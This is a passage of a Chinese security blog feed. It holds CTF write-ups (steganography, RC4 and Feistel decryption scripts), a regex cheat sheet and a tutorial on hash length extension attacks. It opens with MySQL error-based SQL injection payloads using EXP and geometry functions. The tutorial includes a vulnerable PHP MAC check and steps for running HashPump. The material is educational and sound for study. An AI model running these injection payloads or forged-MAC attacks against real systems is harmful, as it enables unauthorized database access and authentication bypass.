EXP(~(SELECT * from(select user())a))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/zriO4fi.png" alt=""></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GeometryCollection()</div><div class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</div><div class="line"></div><div class="line">polygon()</div><div class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipoint()</div><div class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multilinestring()</div><div class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">linestring()</div><div class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</div><div class="line"></div><div class="line">multipolygon()</div><div class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mTPTJNt.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;整理一下那些报错注入的函数吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>typecho backdoor</title>
    <link href="http://Err0rzz.github.io/2017/10/26/typecho-backdoor/"/>
    <id>http://Err0rzz.github.io/2017/10/26/typecho-backdoor/</id>
    <published>2017-10-26T01:12:24.000Z</published>
    <updated>2017-10-26T01:19:10.099Z</updated>
    
    <content type="html"><![CDATA[<p>听说typecho博客留了后门，上课的时候试了一下</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说typecho博客留了后门，上课的时候试了一下&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>问鼎杯决赛</title>
    <link href="http://Err0rzz.github.io/2017/09/24/%E9%97%AE%E9%BC%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
    <id>http://Err0rzz.github.io/2017/09/24/问鼎杯决赛/</id>
    <published>2017-09-24T01:50:08.000Z</published>
    <updated>2017-11-10T08:16:08.921Z</updated>
    
    <content type="html"><![CDATA[<p>决赛去水了一把</p><a id="more"></a><h1 id="3-1-合格铲屎官"><a href="#3-1-合格铲屎官" class="headerlink" title="3-1 合格铲屎官"></a>3-1 合格铲屎官</h1><p>下载下来一张图片，用神奇stegsolve打开,随便按发现通道最低位有点奇怪，先用lsb提取一下。<img src="https://i.imgur.com/0EQPXoe.png" alt="">发现熟悉的pk，save bin为一个zip文件，打开后发现是一串base64加密后的字符串，先解码看一下是什么东西<img src="https://i.imgur.com/0PYmKgo.png" alt="">发现是png文件头，直接写脚本提取一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">f=open(&apos;flag.png&apos;,&apos;wb&apos;)</div><div class="line">a=&apos;&apos;&apos;</div><div class="line">iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6CAYAAACI7Fo9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAVqSURBVHhe7d1bTuRGAEDRIftfK1tIxgNRJNINbpff9xzJmvlpP6q5KpeB5u3v334Bt/bX57/AjQkdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocLe39///zf9/xSCwSY0SFA6BAgdAgQOgQIHQKEDgGLv7329vb2+b/1PDqVZ8dZ67uCe13HV1sc95GRcRo9x7XeI8aZ0SFA6BAgdAgQOgR4GLdw/99d/5xz2/q61jD6Hp/pWuo2CX3NN3jrIJbuf/T6t76uNVzhHJnHrTsECB0ChM6fW/RHG/chdAgQOgQIHQJO8330Z6fx7DhrfYtni7XonHPb+rpe8eoYHHGOjDGjX9AU5twNJkLnzwz9aOM+hA4BQocAoUOA0CHAb68N7P+o1z7zaJ9r72+y1tizHzM6BAgdAoQOAZddo8/107mMrEO3eO3aRt6Lrcee/ZjRIUDoECB0CBA6BAgdAhY/dQeuw4wOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwAfJcVDI3+cgvMZCv3RF8PaXwhb/7WQO/81kpFY5772u/E789jUuHWHAKFDgNAhQOgQcMmHcWseY/Sh09rXexaj4zK569hckRmdIVPMzzbOQ+gQIHQIEPqNTevnRxs9t/7JuDnnssUX/lnWp8+ubY9xOcsY8MGMDgFChwChQ4DQIeD0D+PmWnouIw+sJmcag69Gr22uM48BH8zoECB0CBA6BKy+Rp/rLOvEkWt45izr09E1+lbv75L9nmVMr+rUoY9GuMcxHnllSJcef+Ta5p7fVu/vkv2+Mqb8n1t3CBA6BAgdAoTO7qb19qsbY4YexgHXYEaHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgT4NdWTOeoz7I46Lvswo0OA0CFA6BBw6jX62uvGK6wZrdHZwmF/wGHy06GFvo451/3suCPv0RXGu0LoJ3NUOEK/N2t0CBA6BAgdAlZfo6+5LhvZ/9bntpWj1rzPjvvTMY86X15jRocAoUOAW/eT+e5WeImR8Rp1hfGuMKNDwOqhTzPDnA3YjxkdAoQOAUKHAKFDwC6/j/7o4ducwy593WTktUf67kHlluf/7LhL36fJFca7wowOAUKHAKFDwOVCn9aDczbgP4sfxo3GNPKQZ6mfjrnW8UYeQu19zf96dtyR92lkHFiXW3cIEDoECB0ChA4Bu/xk3FJHPZiCuzl16MA63LpDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ8DQJ8yMftTTWT7c5tF1rH1uI2PlQ4AYdckZfYrm6wY859YdAoQOAUKHgNUfxu3x4Gjt4+5xHSPPEfYYU+5N6L8ddR2PnOlcuA+37hcwxf91g1cIHQKEDgGH/WTcmdbUa+9vxNwxPer8uKbbhL42oXMnbt0hQOgXMM3eXzd4hdAhYGiNPtfaD7tqa3QzOKMuGfpcV4xG6GzBrTsECB0ChA4Bi9foow/ESmv0K4wV92ZGhwChQ4DQIUDoELDLD8wcxcM4+HDr0IEPbt0hQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ4DQIUDoECB0CBA6BAgdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ4DQIUDoECB0CBA6BAgdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChw+39+vUPmuaZZgm+XxcAAAAASUVORK5CYII=</div><div class="line">&apos;&apos;&apos;</div><div class="line">f.write(base64.b64decode(a))</div></pre></td></tr></table></figure></p><p>打开即是flag</p><h1 id="3-2-easy-py"><a href="#3-2-easy-py" class="headerlink" title="3-2 easy_py"></a>3-2 easy_py</h1><p>下载下来一个压缩包,先试试伪加密，用zipCenOp打开之后发现果然加密标志没了。然后把flag.pyc反编译一下,一个加密函数(队友说是rc4)，不过需要个key。于是又打开了key文件，发现是一串熟悉的东西,懒得写脚本，直接用编辑器的替换功能，从9开始替换，把这么一串东西变成一个表达式<br><img src="https://i.imgur.com/KXBDKUZ.png" alt=""><br>得到key之后替换掉加密算法中的key，然后根据加密算法写个解密算法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"># uncompyle6 version 2.9.10</div><div class="line"># Python bytecode 2.7 (62211)</div><div class="line"># Decompiled from: Python 2.7.11 (v2.7.11:6d1b6a68f775, Dec  5 2015, 20:40:30) [                                                                                                                                  MSC v.1500 64 bit (AMD64)]</div><div class="line"># Embedded file name: /home/ctf/WDCTF2017/test.py</div><div class="line"># d: 2017-09-08 19:54:01</div><div class="line">import random</div><div class="line">import base64</div><div class="line">from hashlib import sha1</div><div class="line">strCipher = &apos;Xw6aM5fbiQOkkezmbdLC7Gbnj5siJJc5DpzkVjtdKPKT3A==&apos;</div><div class="line">key = &apos;I_4m-k3y&apos;</div><div class="line"></div><div class="line">def crypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line"></div><div class="line">    x = y = 0</div><div class="line">    out = []</div><div class="line">    for char in data:</div><div class="line">        x = (x + 1) % 256</div><div class="line">        y = (y + box[x]) % 256</div><div class="line">        box[x], box[y] = box[y], box[x]</div><div class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line"></div><div class="line">    return &apos;&apos;.join(out)</div><div class="line"></div><div class="line">def decrypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line">    x = y = 0</div><div class="line">    data1=[]</div><div class="line">    for char in data:</div><div class="line">        x=(x+1)%256</div><div class="line">        y=(y+box[x])%256</div><div class="line">        box[x],box[y] = box[y], box[x]</div><div class="line">        data1.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line">    return &apos;&apos;.join(data1)</div><div class="line"></div><div class="line">  </div><div class="line">def encode(data, key, encode=base64.b64encode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    data = salt + crypt(data, sha1(key + salt).digest())</div><div class="line">    if encode:</div><div class="line">        data = encode(data)</div><div class="line">    return data</div><div class="line"></div><div class="line">def decode(data, key, decode=base64.b64decode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    if decode:</div><div class="line">        data=decode(data)</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    salt=data[:16]</div><div class="line">    out=data[16:]</div><div class="line">    return decrypt(out,sha1(key + salt).digest())</div><div class="line">    </div><div class="line">print decode(strCipher,key)</div></pre></td></tr></table></figure></p><p>得到flag</p><h1 id="4-1-简单加密"><a href="#4-1-简单加密" class="headerlink" title="4-1 简单加密"></a>4-1 简单加密</h1><p>py文件还是个加密函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line"></div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]</div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)</div><div class="line">       d1,d2 = d2,d1</div><div class="line">       print (d2+d1).encode(&apos;hex&apos;)</div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    print bes(&apos;wdctfhhh&apos;,&apos;This_is_the_flag&apos;)</div><div class="line">    # 19714d622d75f32fd9bd98feaa93df0d</div></pre></td></tr></table></figure></p><p>因为没有随机数什么的，根据加密函数稍微改改写个解密函数就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line"></div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]  </div><div class="line"></div><div class="line">    print d2.encode(&apos;hex&apos;)  </div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)  </div><div class="line">       d1,d2 = d2,d1</div><div class="line"></div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line"></div><div class="line">def bes_decrypt(subkeys,data):</div><div class="line">i=0</div><div class="line"></div><div class="line"></div><div class="line">d2= data[:16]</div><div class="line">d2=d2.decode(&apos;hex&apos;)</div><div class="line">d1= data[16:]</div><div class="line">d1=d1.decode(&apos;hex&apos;)</div><div class="line"></div><div class="line">subkeys=subkeys[::-1]</div><div class="line">for i in subkeys:</div><div class="line">d1,d2=d2,d1</div><div class="line">d1 = xor(xor(HASH(d2),i),d1)</div><div class="line"></div><div class="line">return d1+d2</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">def besdd(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_decrypt(subKeys, data)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line"></div><div class="line">    print besdd(&apos;wdctfhhh&apos;,&apos;19714d622d75f32fd9bd98feaa93df0d&apos;)</div><div class="line"></div><div class="line">    # 19714d622d75f32fd9bd98feaa93df0d</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/4DObFyr.png" alt=""></p><h1 id="附加题-万里挑一"><a href="#附加题-万里挑一" class="headerlink" title="附加题:万里挑一"></a>附加题:万里挑一</h1><p>下载下来一个压缩包,里面1024个文件，随便点个进去都是一堆十六进制，想想万里挑一，感觉像是在里面找一个正常的东西，就随便点点。发现有点不正常的地方，<img src="https://i.imgur.com/hvvpNyG.png" alt="">，这个文件和前面的文件有很明显的时间差，像是前面是用什么脚本生成的，而从这里开始是加进去的东西。</p><p>那就点开这个文件，发现<img src="https://i.imgur.com/eIbCIib.png" alt="">很标准的flag形式,WDFLAG{},那就是它了。<br>不过一开始并不知道什么加密方法，用ascii试了试发现不对,然后仔细观察发现每一位都小于10，而且都只有两位，第二位都小于等于4，再想到提示提到短信，那应该就是手机键盘加密了，解开之后再用凯撒加密解开就得到了flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;决赛去水了一把&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>常用正则表达式</title>
    <link href="http://Err0rzz.github.io/2017/09/18/%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://Err0rzz.github.io/2017/09/18/常用正则表达式/</id>
    <published>2017-09-18T11:44:02.000Z</published>
    <updated>2017-09-18T11:56:19.587Z</updated>
    
    <content type="html"><![CDATA[<p>挺实用</p><a id="more"></a><p><strong><code>.at</code></strong><br>可以匹配 cat sat mat #at<br>点可以匹配任意字符</p><p><strong><code>[a-z]at</code></strong><br><strong><code>[a-zA-Z]</code></strong><br>方括号中匹配一个集合类</p><p><strong><code>[^a-z]</code></strong><br>表示不属于该集合里的字符</p><p><strong><code>\*</code></strong> 表示可以被重复 0 次或更多次<br><strong><code>\+</code></strong> 表示可以被重复 1 次或更多次</p><p><strong><code>[[:alnum:]]+</code></strong><br>表示至少有一个字母字符</p><p><strong><code>()</code></strong><br>圆括号用于分割子表达式</p><p><strong><code>(very )*large</code></strong><br>可以匹配 very large、very very large、large</p><p><strong><code>{}</code></strong><br>花括号表示允许重复的次数<br>{3} 表示重复 3 次，{2,4} 表示重复 2~4 次，{2,} 表示至少重复 2 次</p><p><strong><code>^bob</code></strong><br>表示在字符串开始处匹配 bob</p><p><strong><code>com$</code></strong><br>表示在字符串结尾处匹配 com</p><p><strong><code>^[a-zA-Z]$</code></strong><br>表示只匹配一个字母字符的字符串</p><p>用竖线来表示分支选择<br><strong><code>com|edu|net</code></strong><br>表示匹配 com 或 edu 或 net</p><p>匹配特殊字符时，需要使用反斜杠 \ 来进行转义，在 PHP 中还需要再进行转义一次。<br>匹配电子邮件地址<br><strong><code>^[a-zA-Z0-9_\-.]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-.]+$</code></strong></p><p>正则查找字符串<br><strong><code>ereg(string pattern, string search, array [matches]);</code></strong><br><strong><code>eregi</code></strong> 不区分大小写</p><p>正则替换字符串<br><strong><code>string ereg_replace(string pattern, string replacement, string search);</code></strong></p><p>正则分割字符串<br><strong><code>array split(string pattern, string search [, int max]);</code></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;挺实用&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="http://Err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://Err0rzz.github.io/2017/09/18/hash长度扩展攻击/</id>
    <published>2017-09-18T08:22:46.000Z</published>
    <updated>2017-11-26T03:47:22.705Z</updated>
    
    <content type="html"><![CDATA[<p>感觉挺有用就加了进来</p><a id="more"></a><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>首先要讲hash算法(例如md5)，但是也不需要太了解，只需要知道以下几点就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 </div><div class="line">2.我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 </div><div class="line">3.MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！</div></pre></td></tr></table></figure></p><p><strong>有点绕，用个例子讲一下怎么填充</strong><br>比如说计算字符串”admin”<br>十六进制<code>0x64676d696e</code><br>这里与448模512不同余，补位后数据如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</div></pre></td></tr></table></figure></p><p><strong>注意！下图中8是怎么来的！比特第一位补位1，其余为0，那么admin后面（二进制补位1000…000）</strong><br><img src="https://i.imgur.com/zgiAeaj.png" alt=""></p><p><strong>注意！下图中框框中是啥！是全部要加密明文的长度！这里长度不包含填充的长度！而且注意是比特数！而且我们需要注意一点</strong><br><img src="https://i.imgur.com/o3nzjOh.png" alt=""><br><strong>MD5中存储的都是小端方式！</strong><br><strong>MD5中存储的都是小端方式！</strong><br><strong>MD5中存储的都是小端方式！</strong><br><strong>重要的事情说三遍，举个例子：假如我们这一块值为0x12345678<br>那么在MD5运算时候存储的顺序是 0x78563412<br>这也是之所以后8字节为长度，而第1字节先有数据的原因 </strong></p><h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>主要看刚才讲的第三点<br><img src="https://i.imgur.com/lbLj4PE.png" alt=""></p><p>这样的话，假设secret只知道位数的话，将其填充成secret1，其中n=hash(secret)=hash(secret1)已知，则hash(secret1+任意数据)都可以求出，因为(secret1+任意数据)会被分为很多组，第一组为secret1，则<strong>第一组生成的向量即为n</strong>,直接用于接下来的运算即可。所以hash扩展长度攻击我理解就是，已知<strong>secret长度和hash值，就可以求出(secret+任意数据)的hash值</strong>。<br>如果一个应用程序是这样操作的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）</div><div class="line">让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</div><div class="line">服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</div></pre></td></tr></table></figure></p><p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。</p><p>再比如，一个网站在用户下载文件之前需验证下载权限。这个网站会用如下的算法产生一个关于文件名的MAC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def create_mac(key, fileName)</div><div class="line">   return Digest::SHA1.hexdigest(key + fileName)</div><div class="line">End</div></pre></td></tr></table></figure></p><p>最终产生的URL会是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.com/download?file=report.pdf&amp;mac=563162c9c71a17367d44c165b84b85ab59d036f9</div></pre></td></tr></table></figure></p><p>用户发起请求要下载一个文件时，将会执行下面这个函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def verify_mac(key, fileName, userMac)</div><div class="line">    validMac = create_mac(key, filename)</div><div class="line">    if (validMac == userMac) do</div><div class="line">        initiateDownload()</div><div class="line">    else</div><div class="line">        displayError()</div><div class="line">    end</div><div class="line">End</div></pre></td></tr></table></figure></p><p>这样，只有当用户没有擅自更改文件名时服务器才会执行initiateDownload()开始下载。实际上，这种生成MAC的方式，给攻击者在文件名后添加自定义字串留下可乘之机。</p><h1 id="已知salt长度"><a href="#已知salt长度" class="headerlink" title="已知salt长度"></a>已知salt长度</h1><p>题目：<a href="http://www.shiyanbar.com/ctf/1848" title="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="external">http://www.shiyanbar.com/ctf/1848</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</div><div class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</div></pre></td></tr></table></figure><p>其中已知<code>sample-hash</code>，即hash(secret+”adminadmin”)，这时候构造username=”admin”，password=”admin/x80/00…../00gg”，其中使得secret+username+password恰好分为两组，<strong>第一组和secret+adminadmin一样</strong>(因为前面求hash(secret+”adminadmin”)时需要填充成hash(secret+”adminadmin”+”/x80/00…”)),<strong>第二组为gg</strong>,这时候<strong>求hash(secret+username+password)等价于求hash(gg)</strong>,但是初始向量变成第一组的hash值(已知),然后构造cookie中的getmein提交即可</p><p>解法:使用hashpump解，其中安装如下：</p><ul><li>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。<br>（至于别的文章提到了MD4、RIPEMD-160、SHA-0、WHIRLPOOL等也可以构造长度扩展攻击，等以后再研究。）<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/bwall/HashPump</div><div class="line">apt-get install g++ libssl-dev</div><div class="line">cd HashPump</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure></li></ul><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install hashpumpy</div></pre></td></tr></table></figure></p><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python&gt;&gt;&gt; </div><div class="line">import hashpumpy&gt;&gt;&gt; </div><div class="line">help(hashpumpy.hashpump)</div></pre></td></tr></table></figure></p><ul><li><p><img src="https://i.imgur.com/05WwBNT.png" 